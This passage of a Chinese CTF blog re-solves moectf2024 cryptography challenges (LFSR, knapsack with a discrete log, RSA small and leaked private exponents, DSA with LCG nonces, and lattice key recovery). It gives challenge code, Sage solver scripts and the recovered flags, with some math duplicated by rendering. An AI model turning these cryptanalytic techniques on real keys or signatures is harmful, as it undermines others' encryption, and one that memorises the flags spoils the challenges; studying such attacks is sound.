lst[i-1] = lst[i]        lst[127] = 0        res = xor(lst,taps)        if res != tmp:            lst[127] = 1    flag = long_to_bytes(int(''.join(map(str, lst[::-1])), 2))    maybe = 1    for i in flag:        if not chr(i) in string.printable:            maybe = 0            break    if maybe:        print(flag)\nb'e4sy_lin3ar_sys!'b'e4sy_lin3ar_sys!'b'e4sy_lin3ar_sys!'\nmoectf{e4sy_lin3ar_sys!}\n这是我们自己的方法 官方也给了用矩阵思路来求解的wp 话说标题都是Matrix确实该这样做的）\n这里我们分析这个128位的线性反馈寄存器\n把问题拓宽 在一个GF(2)GF(2)GF(2)域中我们对于一个n级的lfsr 我们设它的递推公式是\nai+n=∑k=0n−1ai+kck+1\na_{i+n}=\\sum\\limits^{n-1}_{k=0}a_{i+k}c_{k+1}\n\nai+n​=k=0∑n−1​ai+k​ck+1​\nSi=(ai,ai+1,…,ai+n−1)\nS_i=(a_i,a_{i+1},\\dots,a_{i+n-1})\n\nSi​=(ai​,ai+1​,…,ai+n−1​)\n对应的次态是\nSi+1=(ai+1,ai+2,…,ai+n)\nS_{i+1}=(a_{i+1},a_{i+2},\\dots,a_{i+n})\n\nSi+1​=(ai+1​,ai+2​,…,ai+n​)\n可以构建矩阵运算式\n(ai,ai+1,⋯ ,ai+n−1)⋅(00⋯0c110⋯0c201⋯0c3⋮⋮⋱⋮⋮00⋯1cn)=(ai+1,ai+2,⋯ ,ai+n)\n(a_i, a_{i+1}, \\cdots, a_{i+n-1}) \\cdot \n\\begin{pmatrix}\n0 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_1 \\\\\n1 &amp; 0 &amp; \\cdots &amp; 0 &amp; c_{2} \\\\\n0 &amp; 1 &amp; \\cdots &amp; 0 &amp; c_{3} \\\\\n\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\\n0 &amp; 0 &amp; \\cdots &amp; 1 &amp; c_{n}\n\\end{pmatrix}\n= (a_{i+1}, a_{i+2}, \\cdots, a_{i+n})\n\n(ai​,ai+1​,⋯,ai+n−1​)⋅⎝⎜⎜⎜⎜⎜⎜⎛​010⋮0​001⋮0​⋯⋯⋯⋱⋯​000⋮1​c1​c2​c3​⋮cn​​⎠⎟⎟⎟⎟⎟⎟⎞​=(ai+1​,ai+2​,⋯,ai+n​)\n简记为\nSiC=Si+1\nS_{i}C = S_{i+1}\n\nSi​C=Si+1​\n可见我们把这里的列放在一个无限长的直线上，对这个序列右乘矩阵CCC就能实现我们的“线性移位”，同时对于每一个输出，我们都有\nai+n=Si∗(c1,c2,…,cn)T\na_{i+n}=S_i*(c_{1},c_{2},\\dots,c_{n})^{T}\n\nai+n​=Si​∗(c1​,c2​,…,cn​)T\n我们把这里的\n(c1,c2,…,cn)\n(c_{1},c_{2},\\dots,c_{n})\n\n(c1​,c2​,…,cn​)\n视为未知量，当我们收集到了\na1∼a2n\na_{1}\\sim  a_{2n}\n\na1​∼a2n​\n的所有数据，我们就能构造出nnn个方程\n\n\n\n\n现在我们构造满秩方程组\n(S1S2⋮Sn)(c1c2⋮cn)=(an+1an+2⋮a2n)\n\\begin{pmatrix} S_{1} \\\\ S_2 \\\\ \\vdots \\\\ S_{n}\\end{pmatrix}\\begin{pmatrix}c_{1} \\\\ c_{2} \\\\ \\vdots \\\\ c_n\\end{pmatrix}=\\begin{pmatrix}a_{n+1} \\\\ a_{n+2} \\\\ \\vdots \\\\ a_{2n}\\end{pmatrix}\n\n⎝⎜⎜⎜⎜⎛​S1​S2​⋮Sn​​⎠⎟⎟⎟⎟⎞​⎝⎜⎜⎜⎜⎛​c1​c2​⋮cn​​⎠⎟⎟⎟⎟⎞​=⎝⎜⎜⎜⎜⎛​an+1​an+2​⋮a2n​​⎠⎟⎟⎟⎟⎞​\n显然左边是满秩的，乘逆矩阵就能计算出CCC了\n回到这题，收集的过程是不是就理所当然了呢？\n来点脚本\n# sageF = GF(2)V = VectorSpace(F,n)vec = V(list(map(int, list(output[n:]))))# 这里应该保证output刚好有2n位，不然配不齐M = []for i in range(n-1,2*n-1):    m = []    for j in range(n):        m.append(output[i-j])    M.append(m)M = Matrix(F,M)print(M.rank())sol = M.solve_right(vec)print(len(sol))taps = [idx for idx, val in enumerate(sol) if val == 1]print(\"taps:\", taps)print(\"len(taps):\", len(taps))\n注意这里的lfsr新位在放在后面，是左移加放位的\n成功找到CCC之后，我们就能\nSi−1=SiC−1\nS_{i-1}=S_{i}C^{-1}\n\nSi−1​=Si​C−1\n美美运算找回初态，板子如下\npoly = list(sol)B = Matrix(F,n,n)for i in range(n):    B[i,n-1] = poly[n-1-i]for i in range(n-1):    B[i+1,i] = 1B_inv = B**(-1)t = V(list(map(int,list(output[:n]))))print(long_to_bytes(int(\"\".join(map(str,t*B_inv**(n))),2)))\n说实话推导向右移 放最低位的也是类似的思路，这里就不多写了主要是懒\n EzPack\nfrom Crypto.Util.number import *from secret import flagimport random    p = 2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977# print(p.bit_length()) 1038assert len(flag) == 42    def encode(msg):    return bin(bytes_to_long(msg))[2:].zfill(8*len(msg))def genkey(len):    sums = 0    keys = []    for i in range(len):        k = random.randint(1,7777)        x = sums + k        keys.append(x)        sums += x    return keys    key = genkey(42*8) # 336    def enc(m, keys):    msg = encode(m)    print(len(keys))    print(len(msg))    assert len(msg) == len(keys)    s = sum((k if (int(p,2) == 1) else 1) for p, k in zip(msg, keys))    print(msg)    for p0,k in zip(msg,keys):        print(int(p0,2))    return pow(7,s,p)    cipher = enc(flag,key)  with open(\"output.txt\", \"w\") as fs:    fs.write(str(key)+'\\n')    fs.write(str(cipher))\n背包问题 题目加密流程为把flag编码为二进制01串mmm 然后生成背包序列keykeykey,满足\nki&gt;ki−1+ki−2+⋯+k1\nk_i&gt;k_{i-1}+k_{i-2}+\\dots+k_1\n\nki​&gt;ki−1​+ki−2​+⋯+k1​\n然后根据这个mmm串，构建\ns=∑i=1nmiki\ns=\\sum\\limits^{n}_{i=1}m_ik_i\n\ns=i=1∑n​mi​ki​\n再返回\nc≡  7s  mod  p\nc\\equiv\\;7^{s}\\;mod\\;p\n\nc≡7smodp\n那么很显然，我们先想办法解决这个离散对数问题，求解sss\n对p-1进行分解，结果如下\nfactors = [2, 2, 2, 3, 7, 636277, 677857, 682777, 735809, 860059, 903949, 908441, 954851, 1017139, 1032341, 1163131, 1190737, 1227157, 1341323, 1395671, 1463611, 1556201, 1569401, 1713749, 1930931, 2219563, 2476283, 2477281, 2590633, 2756587, 2833643, 3095713, 3281449, 3688063, 4008793, 4285993, 5443981, 5720053, 5822981, 6201869, 6892217, 7093841, 7319857, 8227237, 9381107, 9477463, 10078729, 10084297, 10764907, 12416167, 14095651, 14294663, 14788051]\n可见十分的光滑，直接使用sage内置的Pohlig-Hellman算法解就行，几乎是秒出\nc = 1210552586072154479867426776758107463169244511186991628141504400199024936339296845132507655589933479768044598418932176690108379140298480790405551573061005655909291462247675584868840035141893556748770266337895571889128422577613223452797329555381197215533551339146807187891070847348454214231505098834813871022509186p = 2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977g = 7R = GF(p)x = R(c).log(g)print(\"解得的 x =\", x)\n官方也给了使用Pohlig-Hellman算法的板子，在这里贴一下\nF = GF(p)a = F(7)X = F(cipher)n = a.order()primes = [2^3,3,7,636277,677857,682777,735809,860059,903949,908441,954851, 1017139, 1032341, 1163131, 1190737, 1227157, 1341323, 1395671, 1463611, 1556201, 1569401, 1713749, 1930931, 2219563, 2476283, 2477281, 2590633, 2756587, 2833643, 3095713, 3281449, 3688063, 4008793, 4285993, 5443981, 5720053, 5822981, 6201869, 6892217, 7093841, 7319857, 8227237, 9381107, 9477463, 10078729, 10084297, 10764907, 12416167, 14095651, 14294663,14788051] dlogs = []for fac in primes: \tt = int(n//fac) \tdlog = discrete_log(X**t, a**t) \tdlogs += [dlog] \tprint(\"factor:\"+str(fac)+\",Discrete Log:\"+str(dlog))\tnc = crt(dlogs,primes)print(nc)assert pow(7,nc,p) == cipher\n大致思路就是转化到模小因子下进行求解对数，再对结果打CRT，这里不细讲\n然后就是求解这个背包了，这里是线性的，我们可以考虑如下思路\n背包密码 | DexterJie’Blog\ndef solve_knapsack(key, target):    key = key.copy()    # 预处理：计算 k-1 并排序（从大到小）    items = [(k - 1) for k in key]    items.sort(reverse=True)    # 贪心选择    selected = []    remaining = target    for num in items:        if remaining &gt;= num:            selected.append(num)            remaining -= num    if remaining != 0:        return None    # 返回对应 bit=0 的位置    bitmask = [1] * len(key)    for num in selected:        idx = next(i for i, k in enumerate(key) if (k - 1) == num)        bitmask[idx] = 0    return bitmasksum = sum(m)target = sum - x    bitmask = solve_knapsack(m, target)# Step 3: 恢复明文msg = ''.join(str(b) for b in bitmask)flag = long_to_bytes(int(msg, 2))print(\"Flag:\", flag.decode())# moectf{429eaa156f6961d6bc655c1887ebb779ec}\n OneMoreBit\nfrom Crypto.Util.number import getStrongPrime, bytes_to_long, GCD, inversefrom Crypto.Util.Padding import padfrom secret import flagimport randomdef genKey(nbits,dbits):    p = getStrongPrime(nbits//2)    q = getStrongPrime(nbits//2)    n = p*q    phi = (p-1)*(q-1)    while True:        d = random.getrandbits(dbits)          if d.bit_length() == dbits:            if GCD(d, phi) == 1:                e = inverse(d, phi)                pk = (n, e)                sk = (p, q, d)                return pk, sknbits = 1024dbits = 258message = pad(flag,16)msg = pad(message, 16)m = bytes_to_long(msg)pk= genKey(nbits, dbits)[0]n, e = pkciphertext = pow(m, e, n)  with open(\"data.txt\",\"w\") as f:    f.write(f\"pk = {pk}\\n\")    f.write(f\"ciphertext = {ciphertext}\\n\")    f.close()\n这里用的是getStrongPrime来生成的素数，具体就是ppp为素数\np−12\n\\frac{p-1}{2}\n\n2p−1​\n也是大素数\n而 p−1;p+1p-1;p+1p−1;p+1光滑度很低\n那么我们生成两个512位强素数p,qp,qp,q\n然后生成258位的私钥ddd 保证(d,ϕ)=1(d,\\phi)=1(d,ϕ)=1,然后反过来生成公钥指数eee 告诉你公钥(e,n)(e,n)(e,n)\n这里肯定不让你分解nnn的\n这里注意到ddd不是256位而是258位，而且是由ddd这样生成eee的，结合题目名字，有什么思路吗🤔\n如果ddd小一点我们考虑拓展维纳攻击，但是这里刚好大了一些\n简单搜索之后找到了Boneh-Durfee攻击方法\nmimoo/RSA-and-LLL-attacks: attacking RSA via lattice reductions (LLL) (github.com)\nsir,this way\n梭一下脚本就能轻松解出d了，但是呢实际上标答使用的是The Verheul and van Tilborg attack\n论文在这里 0811.0063 (arxiv.org)\n可见就算是泄露私钥位数也是非常非常危险的\n EzLCG\nfrom sage.all import *from random import getrandbits, randintfrom secrets import randbelowfrom Crypto.Util.number import getPrime,isPrime,inversefrom Crypto.Util.Padding import padfrom Crypto.Cipher import AESfrom secret import priKey, flagfrom hashlib import sha1import os    q = getPrime(160)while True:    t0 = q*getrandbits(864)    if isPrime(t0+1):        p = t0 + 1        break    x = priKeyassert p % q == 1h = randint(1,p-1)g = pow(h,(p-1)//q,p)y = pow(g,x,p)    def sign(z, k):    r = pow(g,k,p) % q    s = (inverse(k,q)*(z+r*priKey)) % q    return (r,s)    def verify(m,s,r):    z = int.from_bytes(sha1(m).digest(), 'big')    u1 = (inverse(s,q)*z) % q    u2 = (inverse(s,q)*r) % q    r0 = ((pow(g,u1,p)*pow(y,u2,p)) % p) % q    return r0 == r    def lcg(a, b, q, x):    while True:        x = (a * x + b) % q        yield x    msg = [os.urandom(16) for i in range(5)]  a, b, x = [randbelow(q) for _ in range(3)]prng = lcg(a, b, q, x)sigs = []for m, k in zip(msg,prng):    z = int.from_bytes(sha1(m).digest(), \"big\") % q    r, s = sign(z, k)    assert verify(m, s, r)    sigs.append((r,s))    print(f\"{g = }\")print(f\"{h = }\")print(f\"{q = }\")print(f\"{p = }\")print(f\"{msg = }\")print(f\"{sigs = }\")key = sha1(str(priKey).encode()).digest()[:16]iv = os.urandom(16)cipher = AES.new(key, AES.MODE_CBC,iv)ct = cipher.encrypt(pad(flag,16))print(f\"{iv = }\")print(f\"{ct = }\")    '''g = 81569684196645348869992756399797937971436996812346070571468655785762437078898141875334855024163673443340626854915520114728947696423441493858938345078236621180324085934092037313264170158390556505922997447268262289413542862021771393535087410035145796654466502374252061871227164352744675750669230756678480403551h = 13360659280755238232904342818943446234394025788199830559222919690197648501739683227053179022521444870802363019867146013415532648906174842607370958566866152133141600828695657346665923432059572078189013989803088047702130843109809724983853650634669946823993666248096402349533564966478014376877154404963309438891q = 1303803697251710037027345981217373884089065173721p = 135386571420682237420633670579115261427110680959831458510661651985522155814624783887385220768310381778722922186771694358185961218902544998325115481951071052630790578356532158887162956411742570802131927372034113509208643043526086803989709252621829703679985669846412125110620244866047891680775125948940542426381msg = [b'I\\xf0\\xccy\\xd5~\\xed\\xf8A\\xe4\\xdf\\x91+\\xd4_题目用一个私钥$', b'~\\xa0\\x9bCB\\xef\\xc3SY4W\\xf9Aa\\rO', b'\\xe6\\x96\\xf4\\xac\\n9\\xa7\\xc4\\xef\\x82S\\xe9 XpJ', b'3,\\xbb\\xe2-\\xcc\\xa1o\\xe6\\x93+\\xe8\\xea=\\x17\\xd1', b'\\x8c\\x19PHN\\xa8\\xbc\\xfc\\xa20r\\xe5\\x0bMwJ']sigs = [(913082810060387697659458045074628688804323008021, 601727298768376770098471394299356176250915124698), (406607720394287512952923256499351875907319590223, 946312910102100744958283218486828279657252761118), (1053968308548067185640057861411672512429603583019, 1284314986796793233060997182105901455285337520635), (878633001726272206179866067197006713383715110096, 1117986485818472813081237963762660460310066865326), (144589405182012718667990046652227725217611617110, 1028458755419859011294952635587376476938670485840)]iv = b'M\\xdf\\x0e\\x7f\\xeaj\\x17PE\\x97\\x8e\\xee\\xaf:\\xa0\\xc7'ct = b\"\\xa8a\\xff\\xf1[(\\x7f\\xf9\\x93\\xeb0J\\xc43\\x99\\xb25:\\xf5&gt;\\x1c?\\xbd\\x8a\\xcd)i)\\xdd\\x87l1\\xf5L\\xc5\\xc5'N\\x18\\x8d\\xa5\\x9e\\x84\\xfe\\x80\\x9dm\\xcc\"'''\nxxx构建了一个生成器LCG与签名系统DSA然后告诉这个的公钥(g,h)(g,h)(g,h)与好几组签名的结果，(r,s)p,q,m,H(m),g,h(r,s)p,q,m,H(m),g,h(r,s)p,q,m,H(m),g,h，也就是说给出kik_{i}ki​,我们能快速算出rir_{i}ri​，再根据ziz_{i}zi​我们能构建一个有关,x,k1,k2,…,k5x,k_{1},k_{2},\\dots,k_{5}x,k1​,k2​,…,k5​，的方程想办法从其中恢复xxx ？\n我们该代入的代入，不难得到\nkisi≡  (zi+ri    x)  mod  q\nk_{i}s_{i}\\equiv\\;(z_{i}+r_{i}\\;\\;x)\\;mod\\;q\n\nki​si​≡(zi​+ri​x)modq\nki+1si+1≡  (zi+1+ri+1    x)  mod  q\nk_{i+1}s_{i+1}\\equiv\\;(z_{i+1}+r_{i+1}\\;\\;x)\\;mod\\;q\n\nki+1​si+1​≡(zi+1​+ri+1​x)modq\n结合LCG的简易线性关系\nki+1≡  aki+b  mod  q\nk_{i+1}\\equiv\\;ak_{i}+b\\;mod\\;q\n\nki+1​≡aki​+bmodq\n我们先消去bbb,考虑\nki≡  aki−1+b  mod  q\nk_{i}\\equiv\\;ak_{i-1}+b\\;mod\\;q\n\nki​≡aki−1​+bmodq\n即\nki+1−ki  ≡  a(ki−ki−1)  mod  q\nk_{i+1}-k_{i}\\;\\equiv\\;a(k_{i}-k_{i-1})\\;mod\\;q\n\nki+1​−ki​≡a(ki​−ki−1​)modq\n又\nki≡  si−1(zi+ri    x)  mod  q\nk_{i}\\equiv\\;s_{i}^{-1}(z_{i}+r_{i}\\;\\;x)\\;mod\\;q\n\nki​≡si−1​(zi​+ri​x)modq\n代入\nsi+1−1(zi+1+ri+1    x)  −si−1(zi+rix)  ≡  a(si−1(zi+ri    x)  −si−1−1(zi−1+ri−1x))  mod  q\ns_{i+1}^{-1}(z_{i+1}+r_{i+1}\\;\\;x)\\;-s_{i}^{-1}(z_{i}+r_{i}x)\\;\\equiv\\;a(s_{i}^{-1}(z_{i}+r_{i}\\;\\;x)\\;-s_{i-1}^{-1}(z_{i-1}+r_{i-1}x))\\;mod\\;q\n\nsi+1−1​(zi+1​+ri+1​x)−si−1​(zi​+ri​x)≡a(si−1​(zi​+ri​x)−si−1−1​(zi−1​+ri−1​x))modq\n我们把所有和xxx有关的都放到左边，其他的放到右边,但是在这样的话，同时就有了a,xa,xa,x两个未知量…\n呃呃，好像不是这样构造的,看一下wp,\n(ki+2−ki+1)(ki−ki−1)  ≡  (ki+1−ki)2  mod  q\n(k_{i+2}-k_{i+1})(k_{i}-k_{i-1})\\;\\equiv\\;(k_{i+1}-k_{i})^{2}\\;mod\\;q\n\n(ki+2​−ki+1​)(ki​−ki−1​)≡(ki+1​−ki​)2modq\n而我们又知道\nki  ≡  ui+vix  mod  p\nk_{i} \\;\\equiv\\;u_{i}+v_{i}x\\;mod\\;p\n\nki​≡ui​+vi​xmodp\n所以由上式，我们可以得到关于xxx的二次方程，考虑用coppersmith\n(ui+2−ui+1+(vi+2−vi+1)x)((ui−ui−1+(vi−vi−1)x))  ≡  ((ui+1−ui+(vi+1−vi)x))2  mod  p\n(u_{i+2}-u_{i+1}+(v_{i+2}-v_{i+1})x)((u_{i}-u_{i-1}+(v_{i}-v_{i-1})x))\\;\\equiv\\;((u_{i+1}-u_{i}+(v_{i+1}-v_{i})x))^2\\;mod\\;p\n\n(ui+2​−ui+1​+(vi+2​−vi+1​)x)((ui​−ui−1​+(vi​−vi−1​)x))≡((ui+1​−ui​+(vi+1​−vi​)x))2modp\n取i=1i=1i=1即可\nfrom random import getrandbits, randintfrom secrets import randbelowfrom Crypto.Util.number import getPrime,isPrime,inversefrom Crypto.Util.Padding import padfrom Crypto.Cipher import AESfrom hashlib import sha1g = 81569684196645348869992756399797937971436996812346070571468655785762437078898141875334855024163673443340626854915520114728947696423441493858938345078236621180324085934092037313264170158390556505922997447268262289413542862021771393535087410035145796654466502374252061871227164352744675750669230756678480403551h = 13360659280755238232904342818943446234394025788199830559222919690197648501739683227053179022521444870802363019867146013415532648906174842607370958566866152133141600828695657346665923432059572078189013989803088047702130843109809724983853650634669946823993666248096402349533564966478014376877154404963309438891q = 1303803697251710037027345981217373884089065173721p = 135386571420682237420633670579115261427110680959831458510661651985522155814624783887385220768310381778722922186771694358185961218902544998325115481951071052630790578356532158887162956411742570802131927372034113509208643043526086803989709252621829703679985669846412125110620244866047891680775125948940542426381msg = [b'I\\xf0\\xccy\\xd5~\\xed\\xf8A\\xe4\\xdf\\x91+\\xd4_这里用格子反而很麻烦不是很大告诉了一个$', b'~\\xa0\\x9bCB\\xef\\xc3SY4W\\xf9Aa\\rO', b'\\xe6\\x96\\xf4\\xac\\n9\\xa7\\xc4\\xef\\x82S\\xe9 XpJ', b'3,\\xbb\\xe2-\\xcc\\xa1o\\xe6\\x93+\\xe8\\xea=\\x17\\xd1', b'\\x8c\\x19PHN\\xa8\\xbc\\xfc\\xa20r\\xe5\\x0bMwJ']sigs = [(913082810060387697659458045074628688804323008021, 601727298768376770098471394299356176250915124698), (406607720394287512952923256499351875907319590223, 946312910102100744958283218486828279657252761118), (1053968308548067185640057861411672512429603583019, 1284314986796793233060997182105901455285337520635), (878633001726272206179866067197006713383715110096, 1117986485818472813081237963762660460310066865326), (144589405182012718667990046652227725217611617110, 1028458755419859011294952635587376476938670485840)]iv = b'M\\xdf\\x0e\\x7f\\xeaj\\x17PE\\x97\\x8e\\xee\\xaf:\\xa0\\xc7'ct = b\"\\xa8a\\xff\\xf1[(\\x7f\\xf9\\x93\\xeb0J\\xc43\\x99\\xb25:\\xf5&gt;\\x1c?\\xbd\\x8a\\xcd)i)\\xdd\\x87l1\\xf5L\\xc5\\xc5'N\\x18\\x8d\\xa5\\x9e\\x84\\xfe\\x80\\x9dm\\xcc\"    z=[]for m in msg:    z.append(int.from_bytes(sha1(m).digest(), 'big'))# print(z)r=[]s=[]for (i,j) in sigs:    r.append(i)    s.append(j)# print(s)# print(r)u=[]v=[]  for i in range(len(msg)):    u.append((inverse(s[i],q)*z[i]))    v.append((inverse(s[i],q)*r[i]))  F=GF(q)R.&lt;x&gt;=Zmod(q)[]f = (u[3]-u[2]+(v[3]-v[2])*x)*((u[1]-u[0]+(v[1]-v[0])*x))-((u[2]-u[1]+(v[2]-v[1])*x))**2f=f.monic()xx = f.roots()print(xx)for i in xx:    x=i[0]    key = sha1(str(x).encode()).digest()[:16]    cipher = AES.new(key, AES.MODE_CBC,iv)    flag=cipher.decrypt(ct)    print(flag)    # b'moectf{w3ak_n0nce_is_h4rmful_to_h3alth}\\t\\t\\t\\t\\t\\t\\t\\t\\t'\n））\n babelifting\nfrom Crypto.Util.number import *from secret import flag p = getPrime(512)q = getPrime(512)n = p*qe = 0x1001 #d = inverse(e, (p-1)*(q-1))bit_leak = 400d_leak = d &amp; ((1&lt;&lt;bit_leak)-1)msg = bytes_to_long(flag)cipher = pow(msg,e,n)pk = (n, e)  with open('output.txt','w') as f:    f.write(f\"pk = {pk}\\n\")    f.write(f\"cipher = {cipher}\\n\")    f.write(f\"hint = {d_leak}\\n\")    f.close()\nddd的位数的泄露，已知低400位，搜索找到博客\nd低位攻击 &amp; d高位攻击-CSDN博客\n【CTF-RSA】sage脚本_d 低位攻击 - 哔哩哔哩 (bilibili.com)\n思路简述如下\n已知\ned  ≡  1  mod  ϕ(n)\ned\\;\\equiv\\;1\\;mod\\;\\phi(n)\n\ned≡1modϕ(n)\n即\ned  =1+k(p−1)(q−1)  ,(k&lt;e)\ned\\;=1+k(p-1)(q-1)\\;,(k&lt;e)\n\ned=1+k(p−1)(q−1),(k&lt;e)\n两边对24002^{400}2400取模，得到\nedl  ≡  1+k(p−1)(q−1)  mod  2400\ned_{l}\\;\\equiv\\;1+k(p-1)(q-1)\\;mod\\;2^{400}\n\nedl​≡1+k(p−1)(q−1)mod2400\n消去qqq可得\nedl  ≡  1+k(p−1)(np−1)  mod  2400\ned_{l}\\;\\equiv\\;1+k(p-1)(\\frac{n}{p}-1)\\;mod\\;2^{400}\nedl​≡1+k(p−1)(pn​−1)mod2400\n展开一下就是\nkp2+(edl−1−k(n+1))p+kn  ≡  0  mod  2400\nkp^{2}+(ed_{l}-1-k(n+1))p+kn\\;\\equiv\\;0\\;mod\\;2^{400}\n\nkp2+(edl​−1−k(n+1))p+kn≡0mod2400\n我们枚举所有可能的k&lt;ek&lt;ek&lt;e 能得到一个关于ppp的二次方程，也就是说我们能解出来p  mod  2400p\\;mod\\;2^{400}pmod2400\n再考虑coppersmith即可\n注意到这里400位太高，而且nnn也不大，结合题干，我们考虑HenselLifting的方法来求解\n模p^k的同余方程和离散对数求解_同余多项式与crypto-CSDN博客\np = 2k = 100m = pow(p, k)x = var('x')fx = 31635333913961551790218176796 * x ^ 2 + 343355432375781642567844278672 * x + 569420970791634503307822359156# solve the equation f(x)=0 over m=p^ksolutions = solve_mod([fx == 0], m)  for solution in solutions:    print(int(fx(int(solution[0]))) % m == 0) # True\n官方的脚本貌似有点小问题，我这里跑的话会炸内存，没法按照预期跑出来，我的exp修改后如下\n# sage 10.6from Crypto.Util.number import *from tqdm import trange  n, e = (53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123, 4097)cipher = 14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054dl = 1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129  # Initialize list for potential p valuesmp = []  def find_p(pl, n,e):    R.&lt;y&gt; = PolynomialRing(Zmod(n), implementation='NTL')    g = y*2^400 + pl  # Changed from 398 to 400 to match your original approach    g = g.monic()    try:        # Adjusted parameters        gg = g.small_roots(X=2^112, beta=0.5, epsilon=0.05)        if gg:            for root in gg:                p_candidate = int(root)*2^400 + int(pl)                if n % p_candidate == 0:  # Verify it's a factor                    q = n // p_candidate                    phi = (p_candidate-1)*(q-1)                    try:                        d = inverse_mod(e, phi)                        m = pow(cipher, d, n)                        print(long_to_bytes(int(m)))                        mp.append(p_candidate)                    except ValueError:                        continue    except Exception as e:        print(f\"Error in small_roots: {e}\")        return  # Main loopfor k in trange(1, e+1):    try:        # Using solve_mod properly        R_mod = Zmod(2^400)        x_mod = R_mod['x'].gen()        poly = k*x_mod^2 + (e*dl - 1 - (n+1)*k)*x_mod + k*n        roots = poly.roots(multiplicities=False)        for pl in roots:            find_p(int(pl), n,e)    except Exception as e:        print(f\"Error in k={k}: {e}\")        continue  print(\"Found p candidates:\", mp)# b'moectf{7h3_st4rt_0f_c0pp3rsmith!}'\n大概两分钟吧，全跑完数据要十分钟多\n HiddenPoly\nfrom Crypto.Util.Padding import padfrom Crypto.Util.number import *from Crypto.Cipher import AESimport os    q = 264273181570520944116363476632762225021key = os.urandom(16) #16字节的字符串keyiv = os.urandom(16)root = 122536272320154909907460423807891938232f = sum([a*root**i for i,a in enumerate(key)])assert key.isascii()assert f % q == 0  with open('flag.txt','rb') as f:    flag = f.read()  cipher = AES.new(key,AES.MODE_CBC, iv)ciphertext = cipher.encrypt(pad(flag,16)).hex()  with open('output.txt','w') as f:    f.write(f\"{iv = }\" + \"\\n\")    f.write(f\"{ciphertext = }\" + \"\\n\")  iv = b'Gc\\xf2\\xfd\\x94\\xdc\\xc8\\xbb\\xf4\\x84\\xb1\\xfd\\x96\\xcd6\\\\'ciphertext = 'd23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e'\n给你了\nf=∑i=015ai  rooti\nf=\\sum\\limits ^{15}_{i=0}a_{i}\\;root^{i}\n\nf=i=0∑15​ai​rooti\n而且有\nf≡  0  mod  q\nf\\equiv\\;0\\;mod\\;q\n\nf≡0modq\n也就是\n∑i=015ai  rooti  ≡  0  mod  q\n\\sum\\limits ^{15}_{i=0}a_{i}\\;root^{i}\\;\\equiv\\;0\\;mod\\;q\n\ni=0∑15​ai​rooti≡0modq\n接下来我们由这个式子要尝试恢复出keykeykey 考虑这里的aia_{i}ai​十分滴小，我们造个格子，先整一个运算式出来\n(a0,a1,…,a15,−k)(10⋯0root001⋯0root1⋮⋮⋱⋮⋮00⋯1root1500⋯0q)=(a0,a1,…,a15,0)\n(a_0,a_1,\\dots,a_{15},-k)\n\\begin{pmatrix}\n1 &amp; 0 &amp; \\cdots &amp; 0 &amp; root^0 \\\\\n0 &amp; 1 &amp; \\cdots &amp; 0 &amp; root^1 \\\\\n\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\\n0 &amp; 0 &amp; \\cdots &amp; 1 &amp; root^{15} \\\\\n0 &amp; 0 &amp; \\cdots &amp; 0 &amp; q\n\\end{pmatrix}=(a_0,a_1,\\dots,a_{15},0)\n\n(a0​,a1​,…,a15​,−k)⎝⎜⎜⎜⎜⎜⎜⎛​10⋮00​01⋮00​⋯⋯⋱⋯⋯​00⋮10​root0root1⋮root15q​⎠⎟⎟⎟⎟⎟⎟⎞​=(a0​,a1​,…,a15​,0)\n我们可以给格向量最后一列配一个大一点的系数，来使得右边落在最小向量中\n实验一下你取k&gt;128k&gt;128k&gt;128就够用了\n得到了keykeykey 后面就是喜闻乐见的解密了，exp如下\n  from Crypto.Util.Padding import padfrom Crypto.Util.number import *from Crypto.Cipher import AESroot = 122536272320154909907460423807891938232q = 264273181570520944116363476632762225021k = 2^9M = matrix(ZZ, 17, 17)for i in range(16):    M[i,i]=1    M[i,16]=k*root^iM[16,16]=k*qL=M.LLL()# print(L)key = b'\\x0f!r\\x1a\\x071c8Qtjf\\x05C\\x1e\\x1d'iv = b'Gc\\xf2\\xfd\\x94\\xdc\\xc8\\xbb\\xf4\\x84\\xb1\\xfd\\x96\\xcd6\\\\'ciphertext = 'd23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e'ciphertext = bytes.fromhex(ciphertext)  cipher = AES.new(key, AES.MODE_CBC, iv)  plaintext = cipher.decrypt(ciphertext)  print(\"Decrypted plaintext (raw):\", plaintext)b'moectf{th3_first_blood_0f_LLL!@#$}\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e\\x0e'\n至此历经前前后后大几个月，moectf2024已经全部复现，写完这篇blog之后就得去准备期末了））\n","categories":["复现"],"tags":["CTF","LLL","RSA"]}]